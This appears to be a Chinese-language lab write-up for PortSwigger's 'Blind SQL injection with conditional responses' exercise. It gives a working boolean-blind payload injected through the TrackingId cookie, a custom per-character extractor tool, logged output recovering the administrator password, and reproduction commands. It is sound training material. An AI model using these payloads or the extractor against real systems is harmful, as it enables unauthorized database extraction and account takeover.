---
title: "lab-conditional-responses"
links:
  - target: blind-injection-family
    relation: evidences
---

# lab-conditional-responses

> evidences: [[blind-injection-family]]

- 题面:Blind SQL injection with conditional responses(/web-security/sql-injection/blind/lab-conditional-responses)
- 实例:https://0a7d008c03c2ce7e80a4170600ac00e0.web-security-academy.net
- 判定目标:SQLi 注入 `TrackingId` cookie,抽 Administrator 口令并登录

## 关键步

1. 侦察:根页按 `TrackingId` cookie 做 `SELECT ... WHERE TrackingId='<v>'`;命中即渲染 `Welcome back!`(注意叹号,不是 `Welcome back`)。
2. 坑:`xyz' AND '1'='1` 这类以匿名串打底永远不命中——WHERE 要先匹配一行。**payload 前缀必须是服务端已入库的真实 tracking id**(如 `XPVnMaIl613kLDql`)。
3. 造**新件 `blind_oracle`**(布尔预言机抽取器):模板含 `{I}` 和 `{C}`,按位并发逐个字符试 `=`,以响应标记判真假,自动停到串尾。
   模板:`XPVnMaIl613kLDql' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {I}, 1) = '{C}'--`
   (`Administrator` 大小写敏感:`users.username` 是小写 `administrator`;`--` 注释掉尾部引号即可。)
4. 解出口令 `xal4iyox1n3bsbcant53`,取 `/login` 的 csrf → POST 登录 administrator。

## 交册值

Administrator 口令 `xal4iyox1n3bsbcant53`(登录即解题)。

## 证据摘录

```
GET / (cookie TrackingId=XPVnMaIl613kLDql' AND '1'='1'--) -> 含 "Welcome back!"(11528)
blind_oracle <inst>/ --template "XPVnMaIl613kLDql' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {I}, 1) = '{C}'--" --true "Welcome back!" --place cookie:TrackingId --max 30
 -> {"extracted":"xal4iyox1n3bsbcant53","length":20}
POST /login csrf=…&username=administrator&password=xal4iyox1n3bsbcant53 -> 302 /my-account?id=administrator
solved_check / -> {"solved":true}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" --out /tmp/l5-sqli.html
lab_launch launch 5AEEAC77D52D55CDFF3F9A5D86D050C9A77EBFEF7657CCCB459BEE29AD5C3FCE --widget-source /web-security/sql-injection/blind --jar /tmp/mar-jar.json
blind_oracle "<inst>/" --template "XPVnMaIl613kLDql' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {I}, 1) = '{C}'--" --true "Welcome back!" --place cookie:TrackingId --max 30
lab_http post "<inst>/login" --form csrf=<csrf> --form username=administrator --form password=<pw> --jar /tmp/mar-jar.json --follow
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

新件:`blind_oracle`(布尔预言机抽取,`--place cookie|header|body|query`,并发逐字符)。
